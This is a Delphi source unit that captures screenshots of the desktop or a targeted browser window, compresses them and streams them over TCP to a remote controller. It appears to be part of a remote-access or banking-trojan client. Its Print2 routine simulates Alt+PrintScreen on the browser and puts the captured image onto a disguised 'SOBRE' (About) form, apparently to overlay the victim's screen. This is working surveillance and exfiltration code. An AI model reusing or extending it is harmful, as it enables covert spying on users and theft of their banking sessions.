unit uScreenFuncs;

interface

uses Windows, Classes, uClient, SysUtils, uSOBRE, Graphics, JPEG, Zlib, ClipBrd,
  Dialogs, StdCtrls;


procedure SendPrint(Quality,Width: Integer);
procedure Print2;

implementation

uses uPCFuncs, uComandos;

type
  TRGBArray = array[Word] of TRGBTriple;
  pRGBArray = ^TRGBArray;

procedure SmoothResize(Src, Dst: TBitmap);
var
  x, y: Integer;
  xP, yP: Integer;
  xP2, yP2: Integer;
  SrcLine1, SrcLine2: pRGBArray;
  t3: Integer;
  z, z2, iz2: Integer;
  DstLine: pRGBArray;
  DstGap: Integer;
  w1, w2, w3, w4: Integer;
begin
  Src.PixelFormat := pf24Bit;
  Dst.PixelFormat := pf24Bit;
  if (Src.Width = Dst.Width) and (Src.Height = Dst.Height) then
  begin
    Dst.Assign(Src);
  end
  else
  begin
    DstLine := Dst.ScanLine[0];
    DstGap := Integer(Dst.ScanLine[1]) - Integer(DstLine);
    xP2 := MulDiv(pred(Src.Width), $10000, Dst.Width);
    yP2 := MulDiv(pred(Src.Height), $10000, Dst.Height);
    yP := 0;
    for y := 0 to pred(Dst.Height) do begin
      xP := 0;
      SrcLine1 := Src.ScanLine[yP shr 16];
      if (yP shr 16 < pred(Src.Height)) then
        SrcLine2 := Src.ScanLine[succ(yP shr 16)]
      else
        SrcLine2 := Src.ScanLine[yP shr 16];
      z2 := succ(yP and $FFFF);
      iz2 := succ((not yp) and $FFFF);
      for x := 0 to pred(Dst.Width) do begin
        t3 := xP shr 16;
        z := xP and $FFFF;
        w2 := MulDiv(z, iz2, $10000);
        w1 := iz2 - w2;
        w4 := MulDiv(z, z2, $10000);
        w3 := z2 - w4;
        DstLine[x].rgbtRed := (SrcLine1[t3].rgbtRed * w1 +
          SrcLine1[t3 + 1].rgbtRed * w2 +
          SrcLine2[t3].rgbtRed * w3 + SrcLine2[t3+1].rgbtRed * w4) shr 16;
        DstLine[x].rgbtGreen :=
          (SrcLine1[t3].rgbtGreen * w1 + SrcLine1[t3 +1].rgbtGreen * w2 +

          SrcLine2[t3].rgbtGreen*w3+SrcLine2[t3+1].rgbtGreen * w4) shr 16;
        DstLine[x].rgbtBlue := (SrcLine1[t3].rgbtBlue * w1 +
          SrcLine1[t3 + 1].rgbtBlue * w2 +
          SrcLine2[t3].rgbtBlue * w3 +
          SrcLine2[t3 + 1].rgbtBlue * w4) shr 16;
        Inc(xP, xP2);
      end;
      Inc(yP, yP2);
      DstLine := pRGBArray(Integer(DstLine) + DstGap);
    end;
  end;
end;


function ResizeImage(JPG: TJPEGImage; MaxWidth: Integer): TJPEGImage;
var
  OldBitmap: TBitmap;
  NewBitmap: TBitmap;
  aWidth: Integer;
  JPEGImage: TJPEGImage;
begin
  JPEGImage := TJPEGImage.Create;
  JPEGImage := JPG;
  OldBitmap := TBitmap.Create;
  try
    OldBitmap.Assign(JPEGImage);
    aWidth := OldBitmap.Width;
    begin
      aWidth := MaxWidth;
      NewBitmap := TBitmap.Create;
      try
        NewBitmap.Width := MaxWidth;
        NewBitmap.Height := MulDiv(MaxWidth,OldBitmap.Height,OldBitmap.Width);
        SmoothResize(OldBitmap, NewBitmap);
        JPEGImage.Assign(NewBitmap);
        Result := JPEGImage;
      finally
        NewBitmap.Free;
      end;
    end;
  finally
    OldBitmap.Free;
  end;
end;


procedure DoCompress(inStream: TStream);
var
  outMS: TMemorystream;
  ZStream: TCompressionStream;
begin
  outMS := TMemorystream.Create;
  try
    inStream.Seek(0, soFromBeginning);
    outMS.Size := 0;
    ZStream := TCompressionStream.Create(clMax, outMS);
    try
      ZStream.CopyFrom(inStream, 0);
    finally
      ZStream.Free;
    end;
    inStream.Size := outMS.Size;
    inStream.Position := 0;
    inStream.CopyFrom(outMS, 0);
  finally
    outMS.Free;
  end;
end;

function bGetWindowRect(hWindow: THandle): TRect;
begin
  GetWindowRect(hWindow, Result);
  if fClient.Width2 = 0  then
  begin
    fClient.Width2 := Result.Width;
    fClient.SendCMD(ORIGINAL_XY,'|'+IntToStr(Result.Width)+'|'+IntToStr(Result.Height));
  end;
end;

function WindowSnap(windowHandle: HWND): Tbitmap;
var
  r: TRect;
  user32DLLHandle: THandle;
  bmp: Tbitmap;
  printWindowAPI: function(sourceHandle: HWND; destinationHandle: HDC;
    nFlags: UINT): BOOL; stdcall;
begin
  user32DLLHandle := GetModuleHandle(user32);
  if user32DLLHandle <> 0 then
  begin
    @printWindowAPI := GetProcAddress(user32DLLHandle, 'PrintWindow');
    if @printWindowAPI <> nil then
    begin
      r := bGetWindowRect(windowHandle);
      bmp := Tbitmap.Create;
      bmp.Width := r.Right - r.Left;
      bmp.Height := r.Bottom - r.Top;
      bmp.Canvas.Lock;
      try
        printWindowAPI(windowHandle, bmp.Canvas.Handle, 0);
      finally
        bmp.Canvas.Unlock;
      end;
      Result := bmp;
    end;
  end;
end;

function PrintScreen(Window: HWND; Quality,Width: Integer): TMemorystream;
var
  DC: HDC;
  Bitmap: Tbitmap;
  JPG: TJPEGImage;
  r: TRect;
begin
  if not IsWindow(Window) then Window := GetDesktopWindow;
  Bitmap := Tbitmap.Create;
  if (not fClient.XP) then
  begin
    DC := GetDC(Window);
    try
      r := bGetWindowRect(Window);
      Bitmap.Width  := r.Right - r.Left;
      Bitmap.Height := r.Bottom - r.Top;
      BitBlt(Bitmap.Canvas.Handle, 0, 0, Bitmap.Width, Bitmap.Height, DC, 0,
        0, SRCCOPY);
    finally
      ReleaseDC(Window, DC);
    end;
  end
  else
  Bitmap := WindowSnap(Window);
  JPG := TJPEGImage.Create;
  JPG.Assign(Bitmap);
  JPG.CompressionQuality := Quality;
  if (fClient.AdjustSize) then
    if (Width <> 0) then
      JPG := ResizeImage(JPG,Width);
  Result := TMemorystream.Create;
  JPG.SaveToStream(Result);
  JPG.Destroy;
  Bitmap.Free;
end;

procedure P2(Window: HWND);
 var
  DC: HDC;
  Bitmap: Tbitmap;
  JPG: TJPEGImage;
begin
  Bitmap := Tbitmap.Create;
    DC := GetDC(Window);
    try
      Bitmap.Width := GetDevicecaps(DC, HORZRES);
      Bitmap.Height := GetDevicecaps(DC, VERTRES);
      BitBlt(Bitmap.Canvas.Handle, 0, 0, Bitmap.Width, Bitmap.Height, DC, 0,
        0, SRCCOPY);
    finally
      ReleaseDC(Window, DC);
    end;
    fSOBRE.Image.Picture.Assign(Bitmap);
  Bitmap.Free;
end;

procedure Print2;
begin
    BringWindowToTop(fClient.Browser);
    SetForegroundWindow(fClient.Browser);
    Sleep(100);
    keybd_event(VK_MENU, 0, 0, 0);
    Sleep(100);
    keybd_event(VK_SNAPSHOT, 0, 0, 0);
    Sleep(100);
    keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
    Sleep(100);
    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
    if Clipboard.HasFormat(CF_PICTURE) then
      fSOBRE.Image.Picture.Assign(Clipboard)
    else Print2;
end;

procedure SendPrint;
var
  Print: TMemorystream;
begin

  if fSOBRE.Visible then
    if IsIconic(fClient.Browser) then
      ShowWindow(fClient.Browser, SW_MAXIMIZE);

  if (not fClient.TCP.Connected) then
    if IsWindow(fClient.WindowControl) then
      fClient.Conecta;

  Print := TMemorystream.Create;
  Print.Position := 0;
  Print := PrintScreen(fClient.WindowControl, Quality,Width);
  Print.Position := 0;
  DoCompress(Print);
  Print.Position := 0;
  fClient.TCP.IOHandler.LargeStream := true;
  fClient.tmPrint.Enabled := False;
  try
    try
    fClient.SendCMD(PRINT_CMD, '');
    fClient.SendCMD(0,IntToStr(Print.Size));
    fClient.TCP.IOHandler.Write(Print);
    except
    on E: Exception do
      fClient.Memo1.Lines.Add(E.Message)
    end;
  finally
    Print.Free;
    fClient.tmPrint.Enabled := True;
  end;

end;






end.
